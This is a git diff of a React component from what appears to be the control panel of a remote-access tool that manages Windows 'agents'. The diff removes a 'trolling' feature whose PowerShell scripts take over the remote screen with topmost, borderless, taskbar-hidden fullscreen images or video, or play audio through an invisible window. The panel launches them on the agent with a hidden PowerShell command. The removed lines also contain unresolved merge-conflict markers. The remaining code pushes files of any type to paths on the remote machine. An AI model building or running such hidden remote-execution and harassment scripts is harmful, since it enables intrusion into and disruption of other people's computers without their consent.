@@ -1,48 +1,66 @@
-import React, { useEffect, useState, useRef } from 'react';
+import React, { useEffect, useRef, useState } from 'react';
+import { AlertCircle, File as FileIcon, Folder, Image, Trash2, Upload, Video } from 'lucide-react';
+import { useSocket } from './SocketProvider';
+import { Alert, AlertDescription } from './ui/alert';
 import { Button } from './ui/button';
+import { Card, CardContent, CardDescription, CardHeader, CardTitle } from './ui/card';
 import { Input } from './ui/input';
 import { Label } from './ui/label';
-import { Card, CardContent, CardDescription, CardHeader, CardTitle } from './ui/card';
-import { Alert, AlertDescription } from './ui/alert';
-<<<<<<< HEAD
 import { Progress } from './ui/progress';
-import { Upload, File, Image, Video, Folder, AlertCircle, Play, Trash2 } from 'lucide-react';
-=======
-import { Upload, File, Image, Video, Folder, AlertCircle, Play, Trash2, Square, Users } from 'lucide-react';
->>>>>>> 65064d9d58fead668dd69e7827f2cdb398cd35c1
-import { useSocket } from './SocketProvider';
-import { Progress } from './ui/progress';
-import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from './ui/select';
 
 interface PendingFile {
   id: string;
-<<<<<<< HEAD
   file: File;
 }
 
+function makeId() {
+  try {
+    return crypto.randomUUID();
+  } catch {
+    return Math.random().toString(36).slice(2);
+  }
+}
+
+function resolveDestinationPath(destinationPath: string, filename: string): string {
+  const raw = (destinationPath || '').trim();
+  if (!raw) return filename;
+  const lower = raw.toLowerCase();
+  const filenameLower = filename.toLowerCase();
+
+  if (lower.endsWith(`/${filenameLower}`) || lower.endsWith(`\\${filenameLower}`)) {
+    return raw;
+  }
+
+  if (raw.endsWith('/') || raw.endsWith('\\')) {
+    return `${raw}${filename}`;
+  }
+
+  if (/^[a-zA-Z]:$/.test(raw)) {
+    return `${raw}\\${filename}`;
+  }
+
+  const separator = raw.includes('\\') || /^[a-zA-Z]:/.test(raw) ? '\\' : '/';
+  return `${raw}${separator}${filename}`;
+}
+
+function formatFileSize(bytes: number) {
+  if (!Number.isFinite(bytes) || bytes <= 0) return '0 Bytes';
+  const k = 1024;
+  const sizes = ['Bytes', 'KB', 'MB', 'GB', 'TB'];
+  const i = Math.min(sizes.length - 1, Math.floor(Math.log(bytes) / Math.log(k)));
+  return `${(bytes / Math.pow(k, i)).toFixed(i === 0 ? 0 : 2)} ${sizes[i]}`;
+}
+
+function getFileIcon(type: string) {
+  const t = (type || '').toLowerCase();
+  if (t.startsWith('image/')) return <Image className="h-4 w-4" />;
+  if (t.startsWith('video/')) return <Video className="h-4 w-4" />;
+  return <FileIcon className="h-4 w-4" />;
+}
+
 export function BulkUploadManager() {
-  const { socket, connected, selectedAgent, uploadFile, sendCommand } = useSocket();
+  const { socket, connected, selectedAgent, uploadFile } = useSocket();
   const [files, setFiles] = useState<PendingFile[]>([]);
-=======
-  name: string;
-  size: number;
-  type: string;
-  content: string; // base64
-  path?: string;
-  raw?: File;
-}
-
-interface TrollingScript {
-  type: 'image' | 'video';
-  filename: string;
-  path: string;
-  script: string;
-}
-
-export function BulkUploadManager() {
-  const { socket, selectedAgent, agents } = useSocket() as any;
-  const [files, setFiles] = useState<UploadedFile[]>([]);
->>>>>>> 65064d9d58fead668dd69e7827f2cdb398cd35c1
   const [folderPath, setFolderPath] = useState('');
   const [isDragging, setIsDragging] = useState(false);
   const [error, setError] = useState('');
@@ -51,120 +69,39 @@ export function BulkUploadManager() {
   const [uploadingById, setUploadingById] = useState<Record<string, boolean>>({});
   const [progressById, setProgressById] = useState<Record<string, number>>({});
   const fileInputRef = useRef<HTMLInputElement>(null);
-  const [uploadProgress, setUploadProgress] = useState<Record<string, number>>({});
-  const [uploadMeta, setUploadMeta] = useState<Record<string, { start: number; lastTime: number; received: number; total: number; speed: number; eta: number }>>({});
-  const [trollVolume, setTrollVolume] = useState(100);
-  const [trollLoop, setTrollLoop] = useState(true);
-  const [trollAutoClose, setTrollAutoClose] = useState(0);
-  const [targetAgentId, setTargetAgentId] = useState<string | null>(null);
-  const onlineAgents = (agents || []).filter((a: any) => a?.status === 'online');
-  useEffect(() => {
-    if (!targetAgentId) {
-      if (selectedAgent) setTargetAgentId(selectedAgent);
-      else if (onlineAgents.length > 0) setTargetAgentId(onlineAgents[0].id);
-    }
-  }, [selectedAgent, agents]);
 
   const formatError = (err: unknown) => {
     if (err instanceof Error) return err.message;
     return String(err);
   };
 
-  const generateImageTrollingScript = (imagePath: string): string => {
-    return `Add-Type -AssemblyName PresentationFramework
-$w = New-Object Windows.Window
-$w.Title = 'NCH_TROLLING'
-$w.WindowStyle = 'None'
-$w.WindowState = 'Maximized'
-$w.ResizeMode = 'NoResize'
-$w.Topmost = $true
-$w.ShowInTaskbar = $false
+  const processFiles = async (fileList: File[]) => {
+    setError('');
+    setSuccess('');
 
-$i = New-Object Windows.Controls.Image
-$b = New-Object Windows.Media.Imaging.BitmapImage
-$b.BeginInit()
-$b.UriSource = '${imagePath.replace(/\\/g, '\\\\')}'
-$b.EndInit()
-$i.Source = $b
-$i.Stretch = 'UniformToFill'
+    const processed: PendingFile[] = [];
 
-$w.Content = $i
-$w.ShowDialog()`;
-  };
+    for (const file of fileList) {
+      if (file.size > 500 * 1024 * 1024) {
+        setError(`File ${file.name} is too large (max 500MB)`);
+        continue;
+      }
 
-  const generateVideoTrollingScript = (videoPath: string, opts?: { volume?: number; loop?: boolean; autoClose?: number }): string => {
-    const vol = Math.max(0, Math.min(1, (opts?.volume ?? 1)));
-    const loop = Boolean(opts?.loop);
-    const autoClose = Math.max(0, Math.floor(opts?.autoClose ?? 0));
-    return `Add-Type -AssemblyName PresentationFramework
-Add-Type -AssemblyName PresentationCore
+      processed.push({ id: makeId(), file });
+    }
 
-$w = New-Object Windows.Window
-$w.Title = 'NCH_TROLLING'
-$w.WindowStyle = 'None'
-$w.WindowState = 'Maximized'
-$w.ResizeMode = 'NoResize'
-$w.Topmost = $true
-$w.ShowInTaskbar = $false
-$w.Background = 'Black'
-
-$m = New-Object Windows.Controls.MediaElement
-$m.Source = '${videoPath.replace(/\\/g, '\\\\')}'
-$m.LoadedBehavior = 'Manual'
-$m.UnloadedBehavior = 'Stop'
-$m.Stretch = 'UniformToFill'
-$m.Volume = ${vol}
-
-$w.Content = $m
-$w.Add_ContentRendered({
-  try { $m.Play() } catch {}
-})
-${loop ? `Register-ObjectEvent -InputObject $m -EventName 'MediaEnded' -Action { $m.Position = [TimeSpan]::Zero; $m.Play() } | Out-Null` : ``}
-${autoClose > 0 ? `$timer = New-Object System.Windows.Threading.DispatcherTimer
-$timer.Interval = [TimeSpan]::FromSeconds(${autoClose})
-$timer.Add_Tick({ try { $timer.Stop(); $w.Close() } catch {} })
-$timer.Start()` : ``}
-$w.ShowDialog()`;
-  };
-  
-  const generateAudioTrollingScript = (audioUrl: string, opts?: { volume?: number; loop?: boolean; autoClose?: number }): string => {
-    const volPct = Math.max(0, Math.min(100, Math.round((opts?.volume ?? 1) * 100)));
-    const loop = Boolean(opts?.loop);
-    const autoClose = Math.max(0, Math.floor(opts?.autoClose ?? 0));
-    return `$ErrorActionPreference = 'SilentlyContinue'
-Add-Type -AssemblyName PresentationFramework
-Add-Type -AssemblyName PresentationCore
-$w = New-Object Windows.Window
-$w.Title = 'NCH_TROLLING_AUDIO'
-$w.WindowStyle = 'None'
-$w.WindowState = 'Normal'
-$w.ResizeMode = 'NoResize'
-$w.Topmost = $false
-$w.ShowInTaskbar = $false
-$w.Width = 1
-$w.Height = 1
-$w.Opacity = 0.0
-$player = New-Object System.Windows.Media.MediaPlayer
-try {
-  $player.Open([Uri]'${audioUrl.replace(/\\/g, '\\\\')}')
-  $player.Volume = ${Math.max(0, Math.min(1, (opts?.volume ?? 1)))}
-  $player.MediaEnded += { if (${loop}) { $player.Position = [TimeSpan]::Zero; $player.Play() } else { try { $player.Close() } catch {} } }
-  $player.Play()
-} catch {}
-if (${autoClose} -gt 0) {
-  $timer = New-Object System.Windows.Threading.DispatcherTimer
-  $timer.Interval = [TimeSpan]::FromSeconds(${autoClose})
-  $timer.Add_Tick({ try { $timer.Stop(); $player.Close(); $w.Close() } catch {} })
-  $timer.Start()
-}
-$w.ShowDialog()`;
+    setFiles((prev) => [...prev, ...processed]);
+    if (processed.length > 0) {
+      setSuccess(`Added ${processed.length} files`);
+    }
   };
 
   const handleFileSelect = (event: React.ChangeEvent<HTMLInputElement>) => {
     const fileList = event.target.files;
     if (fileList) {
-      processFiles(Array.from(fileList));
+      void processFiles(Array.from(fileList));
     }
+    event.target.value = '';
   };
 
   const handleDrop = (event: React.DragEvent) => {
@@ -172,88 +109,7 @@ $w.ShowDialog()`;
     setIsDragging(false);
     const fileList = event.dataTransfer.files;
     if (fileList) {
-      processFiles(Array.from(fileList));
-    }
-  };
-
-  const makeId = () => {
-    try {
-      return crypto.randomUUID();
-    } catch {
-      return Math.random().toString(36).slice(2);
-    }
-  };
-
-  const resolveDestinationPath = (basePath: string, filename: string) => {
-    const raw = (basePath || '').trim();
-    if (!raw) return filename;
-    const lower = raw.toLowerCase();
-    const filenameLower = filename.toLowerCase();
-    if (lower.endsWith(`/${filenameLower}`) || lower.endsWith(`\\${filenameLower}`)) {
-      return raw;
-    }
-    if (raw.endsWith('/') || raw.endsWith('\\')) {
-      return `${raw}${filename}`;
-    }
-    if (/^[a-zA-Z]:$/.test(raw)) {
-      return `${raw}\\${filename}`;
-    }
-    const separator = raw.includes('\\') || /^[a-zA-Z]:/.test(raw) ? '\\' : '/';
-    return `${raw}${separator}${filename}`;
-  };
-
-  const processFiles = async (fileList: File[]) => {
-    setError('');
-    setSuccess('');
-    
-    const processedFiles: PendingFile[] = [];
-    
-    for (const file of fileList) {
-<<<<<<< HEAD
-      if (file.size > 50 * 1024 * 1024) {
-        setError(`File ${file.name} is too large (max 50MB)`);
-        continue;
-      }
-
-      const allowedTypes = ['image/jpeg', 'image/png', 'image/gif', 'image/webp', 'video/mp4', 'video/webm', 'video/avi', 'video/x-msvideo'];
-      if (!allowedTypes.includes(file.type)) {
-        setError(`File ${file.name} type not supported. Use: JPG, PNG, GIF, WebP, MP4, WebM, AVI`);
-        continue;
-      }
-
-      processedFiles.push({ id: makeId(), file });
-=======
-      if (file.size > 500 * 1024 * 1024) { // 500MB limit
-        setError(`File ${file.name} is too large (max 500MB)`);
-        continue;
-      }
-      const t = (file.type || '').toLowerCase();
-      const isSupported = t.startsWith('image/') || t.startsWith('video/') || t.startsWith('audio/');
-      if (!isSupported) {
-        // Accept unknown/empty types; attempt upload anyway
-        // If trolling fails due to unsupported type, the handler will show an error.
-      }
-
-      try {
-        const base64 = await fileToBase64(file);
-        processedFiles.push({
-          id: Math.random().toString(36).substr(2, 9),
-          name: file.name,
-          size: file.size,
-          type: file.type,
-          content: base64,
-          path: folderPath || `C:\\Users\\${file.name}`,
-          raw: file
-        });
-      } catch (err) {
-        setError(`Failed to process ${file.name}: ${err}`);
-      }
->>>>>>> 65064d9d58fead668dd69e7827f2cdb398cd35c1
-    }
-
-    setFiles(prev => [...prev, ...processedFiles]);
-    if (processedFiles.length > 0) {
-      setSuccess(`Added ${processedFiles.length} files`);
+      void processFiles(Array.from(fileList));
     }
   };
 
@@ -267,8 +123,8 @@ $w.ShowDialog()`;
 
     const expectedDestinationPath = resolveDestinationPath(destinationPath, pending.file.name);
 
-    setUploadingById(prev => ({ ...prev, [pending.id]: true }));
-    setProgressById(prev => ({ ...prev, [pending.id]: 0 }));
+    setUploadingById((prev) => ({ ...prev, [pending.id]: true }));
+    setProgressById((prev) => ({ ...prev, [pending.id]: 0 }));
 
     await new Promise<void>((resolve, reject) => {
       const maxMs = Math.min(20 * 60 * 1000, Math.max(90 * 1000, pending.file.size * 2));
@@ -289,9 +145,10 @@ $w.ShowDialog()`;
         if (!data) return;
         if (data.agent_id !== selectedAgent) return;
         if (data.filename !== pending.file.name) return;
-        if (data.destination_path !== expectedDestinationPath) return;
+        const destination = data.destination_path || data.destination;
+        if (destination !== expectedDestinationPath) return;
         if (typeof data.progress === 'number' && data.progress >= 0) {
-          setProgressById(prev => ({ ...prev, [pending.id]: data.progress }));
+          setProgressById((prev) => ({ ...prev, [pending.id]: data.progress }));
         }
       };
 
@@ -300,9 +157,10 @@ $w.ShowDialog()`;
         if (!data) return;
         if (data.agent_id !== selectedAgent) return;
         if (data.filename !== pending.file.name) return;
-        if (data.destination_path !== expectedDestinationPath) return;
+        const destination = data.destination_path || data.destination;
+        if (destination !== expectedDestinationPath) return;
         cleanup();
-        setProgressById(prev => ({ ...prev, [pending.id]: 100 }));
+        setProgressById((prev) => ({ ...prev, [pending.id]: 100 }));
         resolve();
       };
 
@@ -311,336 +169,50 @@ $w.ShowDialog()`;
       uploadFile(selectedAgent, pending.file, expectedDestinationPath);
     });
   };
-  
-  const bytesToBase64 = (bytes: Uint8Array): string => {
-    let binary = '';
-    const CHUNK = 0x8000;
-    for (let i = 0; i < bytes.length; i += CHUNK) {
-      binary += String.fromCharCode(...bytes.subarray(i, i + CHUNK));
-    }
-    return btoa(binary);
-  };
-  
-  const formatBytesPerSec = (bps: number) => {
-    if (!isFinite(bps) || bps <= 0) return '0 B/s';
-    const k = 1024;
-    if (bps < k) return `${Math.round(bps)} B/s`;
-    if (bps < k * k) return `${(bps / k).toFixed(1)} KB/s`;
-    if (bps < k * k * k) return `${(bps / (k * k)).toFixed(2)} MB/s`;
-    return `${(bps / (k * k * k)).toFixed(2)} GB/s`;
-  };
-  
-  const formatSeconds = (s: number) => {
-    if (!isFinite(s) || s <= 0) return '—';
-    const m = Math.floor(s / 60);
-    const ss = Math.floor(s % 60);
-    return `${m}:${ss.toString().padStart(2, '0')}`;
-  };
 
-<<<<<<< HEAD
   const uploadSingle = async (pending: PendingFile) => {
-=======
-  const uploadFile = async (file: UploadedFile, agentOverride?: string | null) => {
-    const agentId = agentOverride ?? targetAgentId ?? selectedAgent ?? (onlineAgents[0]?.id || null);
-    if (!socket || !agentId) {
-      setError('No agent selected');
-      return;
-    }
-
-    setIsUploading(true);
->>>>>>> 65064d9d58fead668dd69e7827f2cdb398cd35c1
     setError('');
     setSuccess('');
+    setIsUploading(true);
     try {
-<<<<<<< HEAD
       await uploadAndWait(pending, folderPath);
-      setFiles(prev => prev.filter(f => f.id !== pending.id));
+      setFiles((prev) => prev.filter((f) => f.id !== pending.id));
       setSuccess(`File ${pending.file.name} uploaded successfully`);
-=======
-      const uploadId = `ul_${Date.now()}_${Math.random().toString(16).slice(2)}`;
-      const destination = file.path || `C:\\Users\\${file.name}`;
-      socket.emit('upload_file_start', {
-        agent_id: agentId,
-        upload_id: uploadId,
-        filename: file.name,
-        destination,
-        total_size: file.size,
-      });
-      const chunkSize = 512 * 1024;
-      const chunkDelayMs = 10;
-      let sentBytes = 0;
-      let lastTs = Date.now() / 1000;
-      const updateLocalProgress = (off: number) => {
-        const now = Date.now() / 1000;
-        const dt = Math.max(0.001, now - lastTs);
-        const dr = Math.max(0, off - sentBytes);
-        const speed = dr / dt;
-        sentBytes = off;
-        lastTs = now;
-        const pct = Math.min(100, Math.round((off / file.size) * 100));
-        setUploadProgress(prev => ({ ...prev, [file.name]: pct }));
-        setUploadMeta(prev => ({ 
-          ...prev, 
-          [file.name]: { 
-            start: prev[file.name]?.start ?? now, 
-            lastTime: now, 
-            received: off, 
-            total: file.size, 
-            speed, 
-            eta: speed > 0 ? (file.size - off) / speed : 0 
-          } 
-        }));
-      };
-      if (file.raw) {
-        for (let offset = 0; offset < file.raw.size; offset += chunkSize) {
-          const slice = file.raw.slice(offset, offset + chunkSize);
-          const buffer = await slice.arrayBuffer();
-          const bytes = new Uint8Array(buffer);
-          const chunkB64 = bytesToBase64(bytes);
-          socket.emit('upload_file_chunk', {
-            agent_id: agentId,
-            upload_id: uploadId,
-            chunk: chunkB64,
-            offset,
-          });
-          updateLocalProgress(Math.min(offset + bytes.length, file.size));
-          await new Promise(r => setTimeout(r, chunkDelayMs));
-        }
-      } else {
-        const binaryString = atob(file.content);
-        const total = binaryString.length;
-        for (let i = 0; i < total; i += chunkSize) {
-          const slice = binaryString.slice(i, i + chunkSize);
-          const chunkB64 = btoa(slice);
-          socket.emit('upload_file_chunk', {
-            agent_id: agentId,
-            upload_id: uploadId,
-            chunk: chunkB64,
-            offset: i,
-          });
-          updateLocalProgress(Math.min(i + slice.length, total));
-          await new Promise(r => setTimeout(r, chunkDelayMs));
-        }
-      }
-      const completionPromise = new Promise<void>((resolve, reject) => {
-        const handler = (data: any) => {
-          const ok = Boolean(data?.success);
-          const fn = String(data?.filename || '');
-          if (fn === file.name) {
-            socket.off('file_upload_complete', handler);
-            if (ok) resolve();
-            else reject(new Error(data?.error || 'Upload failed'));
-          }
-        };
-        socket.on('file_upload_complete', handler);
-      });
-      socket.emit('upload_file_complete', {
-        agent_id: agentId,
-        upload_id: uploadId,
-      });
-      await completionPromise;
-      setSuccess(`File ${file.name} uploaded successfully`);
-      setFiles(prev => prev.filter(f => f.id !== file.id));
-      
->>>>>>> 65064d9d58fead668dd69e7827f2cdb398cd35c1
     } catch (err) {
       setError(`Upload failed: ${formatError(err)}`);
     } finally {
-      setUploadingById(prev => ({ ...prev, [pending.id]: false }));
+      setUploadingById((prev) => ({ ...prev, [pending.id]: false }));
+      setIsUploading(false);
     }
   };
-
-<<<<<<< HEAD
-  const startTrolling = async (pending: PendingFile) => {
-    if (!selectedAgent) {
-=======
-  const uploadAssetToController = async (file: UploadedFile): Promise<string> => {
-    if (!socket) throw new Error('Socket not connected');
-    const uploadId = `troll_${Date.now()}_${Math.random().toString(16).slice(2)}`;
-    const totalSize = file.raw ? file.raw.size : (file.size || 0);
-    return new Promise<string>(async (resolve, reject) => {
-      const readyHandler = (data: any) => {
-        if (String(data?.upload_id || '') !== uploadId) return;
-        socket.off('troll_asset_ready', readyHandler);
-        socket.off('troll_asset_progress', progressHandler);
-        if (data?.error) reject(new Error(String(data.error)));
-        else if (data?.url) resolve(String(data.url));
-        else reject(new Error('No URL generated'));
-      };
-      const progressHandler = (data: any) => {
-        if (String(data?.upload_id || '') !== uploadId) return;
-        const pct = Number(data?.progress || 0);
-        setUploadProgress(prev => ({ ...prev, [file.name]: pct }));
-      };
-      socket.on('troll_asset_ready', readyHandler);
-      socket.on('troll_asset_progress', progressHandler);
-      try {
-        socket.emit('troll_asset_start', {
-          upload_id: uploadId,
-          filename: file.name,
-          total_size: totalSize,
-        });
-        const chunkSize = 512 * 1024;
-        if (file.raw) {
-          for (let offset = 0; offset < file.raw.size; offset += chunkSize) {
-            const slice = file.raw.slice(offset, offset + chunkSize);
-            const buffer = await slice.arrayBuffer();
-            const bytes = new Uint8Array(buffer);
-            const chunkB64 = bytesToBase64(bytes);
-            socket.emit('troll_asset_chunk', {
-              upload_id: uploadId,
-              chunk: chunkB64,
-              offset,
-            });
-          }
-        } else {
-          const binaryString = atob(file.content);
-          const total = binaryString.length;
-          for (let i = 0; i < total; i += chunkSize) {
-            const slice = binaryString.slice(i, i + chunkSize);
-            const chunkB64 = btoa(slice);
-            socket.emit('troll_asset_chunk', {
-              upload_id: uploadId,
-              chunk: chunkB64,
-              offset: i,
-            });
-          }
-        }
-        socket.emit('troll_asset_complete', {
-          upload_id: uploadId,
-        });
-      } catch (e) {
-        socket.off('troll_asset_ready', readyHandler);
-        socket.off('troll_asset_progress', progressHandler);
-        reject(e);
-      }
-    });
-  };
-
-  const startTrollingForAgent = async (file: UploadedFile, agentId: string | null) => {
-    if (!socket || !agentId) {
->>>>>>> 65064d9d58fead668dd69e7827f2cdb398cd35c1
-      setError('No agent selected');
-      return;
-    }
-
-    const filePath = resolveDestinationPath(folderPath, pending.file.name);
-    let script: string;
-
-<<<<<<< HEAD
-    if (pending.file.type.startsWith('image/')) {
-      script = generateImageTrollingScript(filePath);
-    } else if (pending.file.type.startsWith('video/')) {
-      script = generateVideoTrollingScript(filePath);
-=======
-    if (file.type.startsWith('image/')) {
-      // Controller-hosted URL
-      const url = await uploadAssetToController(file);
-      script = generateImageTrollingScript(url);
-    } else if (file.type.startsWith('video/')) {
-      const url = await uploadAssetToController(file);
-      script = generateVideoTrollingScript(url, { volume: trollVolume / 100, loop: trollLoop, autoClose: trollAutoClose });
-    } else if (file.type.startsWith('audio/')) {
-      const url = await uploadAssetToController(file);
-      script = generateAudioTrollingScript(url, { volume: trollVolume / 100, loop: trollLoop, autoClose: trollAutoClose });
->>>>>>> 65064d9d58fead668dd69e7827f2cdb398cd35c1
-    } else {
-      setError('Unsupported file type for trolling');
-      return;
-    }
-
-    try {
-<<<<<<< HEAD
-      await uploadAndWait(pending, folderPath);
-      setFiles(prev => prev.filter(f => f.id !== pending.id));
-      sendCommand(selectedAgent, `powershell -WindowStyle Hidden -Command "${script.replace(/"/g, '\\"').replace(/\n/g, '; ')}"`);
-      setSuccess(`Trolling started with ${pending.file.name}`);
-=======
-      socket.emit('command', {
-        agent_id: agentId,
-        command: `powershell -WindowStyle Hidden -Command "${script.replace(/"/g, '\\"').replace(/\n/g, '; ')}"`,
-        execution_id: `trolling-${Date.now()}`
-      });
-      
-      setSuccess(`Trolling started with ${file.name} on ${agentId}`);
-      
->>>>>>> 65064d9d58fead668dd69e7827f2cdb398cd35c1
-    } catch (err) {
-      setError(`Trolling failed: ${formatError(err)}`);
-    } finally {
-      setUploadingById(prev => ({ ...prev, [pending.id]: false }));
-    }
-  };
-  
-  const startTrolling = async (file: UploadedFile) => {
-    const agentId = targetAgentId ?? selectedAgent ?? (onlineAgents[0]?.id || null);
-    await startTrollingForAgent(file, agentId);
-  };
-  
-  useEffect(() => {
-    const onProgress = (e: Event) => {
-      const detail: any = (e as CustomEvent).detail;
-      if (!detail) return;
-      if (selectedAgent && detail.agent_id && detail.agent_id !== selectedAgent) return;
-      const fn = String(detail.filename || '');
-      const pct = Math.max(0, Math.min(100, Number(detail.progress || 0)));
-      const received = Number(detail.received || 0);
-      const total = Number(detail.total || 0);
-      const now = Date.now() / 1000;
-      setUploadMeta(prev => {
-        const meta = prev[fn] || { start: now, lastTime: now, received, total, speed: 0, eta: 0 };
-        const dt = Math.max(0.001, now - meta.lastTime);
-        const dr = Math.max(0, received - meta.received);
-        const inst = dr / dt;
-        const speed = meta.speed ? (meta.speed * 0.7 + inst * 0.3) : inst;
-        const remaining = Math.max(0, total - received);
-        const eta = speed > 0 ? remaining / speed : 0;
-        return { ...prev, [fn]: { start: meta.start, lastTime: now, received, total, speed, eta } };
-      });
-      setUploadProgress(prev => ({ ...prev, [fn]: pct }));
-    };
-    const onComplete = (e: Event) => {
-      const detail: any = (e as CustomEvent).detail;
-      if (!detail) return;
-      if (selectedAgent && detail.agent_id && detail.agent_id !== selectedAgent) return;
-      const fn = String(detail.filename || '');
-      setUploadProgress(prev => ({ ...prev, [fn]: 100 }));
-      setUploadMeta(prev => {
-        const meta = prev[fn];
-        if (!meta) return prev;
-        return { ...prev, [fn]: { ...meta, received: meta.total, speed: meta.speed, eta: 0 } };
-      });
-    };
-    window.addEventListener('file_upload_progress', onProgress as EventListener);
-    window.addEventListener('file_upload_complete', onComplete as EventListener);
-    return () => {
-      window.removeEventListener('file_upload_progress', onProgress as EventListener);
-      window.removeEventListener('file_upload_complete', onComplete as EventListener);
-    };
-  }, [selectedAgent]);
 
   const uploadAllFiles = async () => {
     if (files.length === 0) {
       setError('No files to upload');
       return;
     }
+    if (!selectedAgent) {
+      setError('No agent selected');
+      return;
+    }
 
     setIsUploading(true);
     setError('');
-    
+    setSuccess('');
+
     let successCount = 0;
     let errorCount = 0;
 
     for (const pending of [...files]) {
       try {
         await uploadAndWait(pending, folderPath);
-        setFiles(prev => prev.filter(f => f.id !== pending.id));
+        setFiles((prev) => prev.filter((f) => f.id !== pending.id));
         successCount++;
       } catch (err) {
         errorCount++;
         setError(`Failed to upload ${pending.file.name}: ${formatError(err)}`);
       } finally {
-        setUploadingById(prev => ({ ...prev, [pending.id]: false }));
+        setUploadingById((prev) => ({ ...prev, [pending.id]: false }));
       }
     }
 
@@ -649,31 +221,15 @@ $w.ShowDialog()`;
   };
 
   const removeFile = (fileId: string) => {
-    setFiles(prev => prev.filter(f => f.id !== fileId));
-  };
-
-  const getFileIcon = (type: string) => {
-    if (type.startsWith('image/')) return <Image className="h-4 w-4" />;
-    if (type.startsWith('video/')) return <Video className="h-4 w-4" />;
-    return <File className="h-4 w-4" />;
-  };
-
-  const formatFileSize = (bytes: number) => {
-    if (bytes === 0) return '0 Bytes';
-    const k = 1024;
-    const sizes = ['Bytes', 'KB', 'MB', 'GB'];
-    const i = Math.floor(Math.log(bytes) / Math.log(k));
-    return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
+    setFiles((prev) => prev.filter((f) => f.id !== fileId));
   };
 
   return (
-    <div className="space-y-4">
+    <div className="space-y-4 w-full max-w-5xl mx-auto">
       <Card>
         <CardHeader>
-          <CardTitle>Bulk File Upload & Trolling</CardTitle>
-          <CardDescription>
-            Upload files to selected agents and start trolling with images or videos
-          </CardDescription>
+          <CardTitle>Bulk File Upload</CardTitle>
+          <CardDescription>Upload files to the currently selected agent</CardDescription>
         </CardHeader>
         <CardContent className="space-y-4">
           {error && (
@@ -682,7 +238,7 @@ $w.ShowDialog()`;
               <AlertDescription>{error}</AlertDescription>
             </Alert>
           )}
-          
+
           {success && (
             <Alert>
               <AlertDescription>{success}</AlertDescription>
@@ -691,80 +247,22 @@ $w.ShowDialog()`;
 
           <div className="space-y-2">
             <Label htmlFor="folder-path">Target Folder or Full Path</Label>
-            <div className="flex gap-2">
+            <div className="flex flex-col sm:flex-row gap-2">
               <Input
                 id="folder-path"
                 placeholder="C:\\Users\\Username\\Downloads"
                 value={folderPath}
                 onChange={(e) => setFolderPath(e.target.value)}
-                className="font-mono"
+                className="font-mono flex-1 min-w-0"
               />
-              <Button
-                variant="outline"
-                size="icon"
-                onClick={() => setFolderPath('C:\\Users\\')}
-              >
+              <Button variant="outline" size="icon" className="shrink-0" onClick={() => setFolderPath('C:\\Users\\')}>
                 <Folder className="h-4 w-4" />
               </Button>
             </div>
           </div>
-          
-          <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
-            <div className="space-y-2">
-              <Label className="flex items-center gap-2"><Users className="h-3 w-3" />Target Agent</Label>
-              <Select value={targetAgentId ?? ''} onValueChange={(v) => setTargetAgentId(v)}>
-                <SelectTrigger className="w-full">
-                  <SelectValue placeholder={targetAgentId ?? 'Select agent'} />
-                </SelectTrigger>
-                <SelectContent>
-                  {onlineAgents.map((a: any) => (
-                    <SelectItem key={a.id} value={a.id}>{a.name || a.id}</SelectItem>
-                  ))}
-                </SelectContent>
-              </Select>
-              <div className="text-xs text-muted-foreground">
-                {onlineAgents.length === 0 ? 'No online agents' : `Online: ${onlineAgents.length}`}
-              </div>
-            </div>
-          </div>
-          
-          <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
-            <div className="space-y-2">
-              <Label>Volume</Label>
-              <Input
-                type="range"
-                min={0}
-                max={100}
-                step={1}
-                value={trollVolume}
-                onChange={(e) => setTrollVolume(Number(e.target.value))}
-              />
-              <div className="text-xs text-muted-foreground">{trollVolume}%</div>
-            </div>
-            <div className="space-y-2">
-              <Label>Loop Video</Label>
-              <div className="flex items-center gap-2">
-                <Button variant={trollLoop ? 'default' : 'outline'} size="sm" onClick={() => setTrollLoop(!trollLoop)}>
-                  {trollLoop ? 'On' : 'Off'}
-                </Button>
-              </div>
-              <div className="text-xs text-muted-foreground">Restart when finished</div>
-            </div>
-            <div className="space-y-2">
-              <Label>Auto-Close (seconds)</Label>
-              <Input
-                type="number"
-                min={0}
-                step={1}
-                value={trollAutoClose}
-                onChange={(e) => setTrollAutoClose(Math.max(0, Number(e.target.value)))}
-              />
-              <div className="text-xs text-muted-foreground">{trollAutoClose > 0 ? `Closes after ${trollAutoClose}s` : 'No auto-close'}</div>
-            </div>
-          </div>
 
           <div
-            className={`border-2 border-dashed rounded-lg p-8 text-center cursor-pointer transition-colors ${
+            className={`border-2 border-dashed rounded-lg p-6 sm:p-8 text-center cursor-pointer transition-colors select-none ${
               isDragging ? 'border-primary bg-primary/5' : 'border-border hover:border-primary'
             }`}
             onDragOver={(e) => {
@@ -774,19 +272,23 @@ $w.ShowDialog()`;
             onDragLeave={() => setIsDragging(false)}
             onDrop={handleDrop}
             onClick={() => fileInputRef.current?.click()}
+            role="button"
+            tabIndex={0}
+            onKeyDown={(e) => {
+              if (e.key === 'Enter' || e.key === ' ') {
+                e.preventDefault();
+                fileInputRef.current?.click();
+              }
+            }}
           >
             <Upload className="mx-auto h-8 w-8 mb-2 text-muted-foreground" />
-            <p className="text-sm text-muted-foreground mb-1">
-              Drag and drop files here, or click to select
-            </p>
-            <p className="text-xs text-muted-foreground">
-              Supports images (JPG, PNG, GIF, WebP), videos (MP4, WebM, AVI), and audio (MP3, WAV, OGG, FLAC)
-            </p>
+            <p className="text-sm text-muted-foreground mb-1">Drag and drop files here, or click to select</p>
+            <p className="text-xs text-muted-foreground">Max size: 500MB per file</p>
             <Input
               ref={fileInputRef}
               type="file"
               multiple
-              accept="image/*,video/*,audio/*"
+              accept="*/*"
               onChange={handleFileSelect}
               className="hidden"
             />
@@ -794,49 +296,19 @@ $w.ShowDialog()`;
 
           {files.length > 0 && (
             <div className="space-y-2">
-                <div className="flex justify-between items-center">
-                  <h4 className="font-medium">Selected Files ({files.length})</h4>
-                  <Button
-                  onClick={uploadAllFiles}
-                  disabled={isUploading || (!targetAgentId && onlineAgents.length === 0)}
-                  size="sm"
-                >
+              <div className="flex flex-col sm:flex-row sm:justify-between sm:items-center gap-2">
+                <h4 className="font-medium">Selected Files ({files.length})</h4>
+                <Button onClick={uploadAllFiles} disabled={isUploading || !selectedAgent} size="sm" className="sm:self-auto self-start">
